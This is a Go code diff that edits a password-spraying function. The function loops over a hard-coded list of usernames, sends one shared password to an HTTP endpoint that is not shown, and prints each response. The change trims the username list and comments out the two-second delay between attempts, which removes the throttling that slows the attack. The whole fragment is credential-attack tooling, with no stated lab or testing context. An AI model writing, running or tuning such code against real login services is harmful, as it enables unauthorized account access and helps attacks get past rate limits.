@@ -5,7 +5,6 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
-	"time"
 )
 
 func main() {
@@ -14,7 +13,7 @@ func main() {
 
 // Password spray
 func PasswordSpray() {
-	var usernames []string = []string{"ankithans", "johndoe01", "ap23", "pateladit01", "abc", "def", "ffdd", "sdwdw", "sdwwd"}
+	var usernames []string = []string{"ankithans", "johndoe01", "ap23", "pateladit01", "abc"}
 	var password = "abc@def"
 
 	for _, username := range usernames {
@@ -29,7 +28,7 @@ func PasswordSpray() {
 		}
 
 		fmt.Println(string(responseData))
-		time.Sleep(2 * time.Second)
+		// time.Sleep(2 * time.Second)
 	}
 
 }
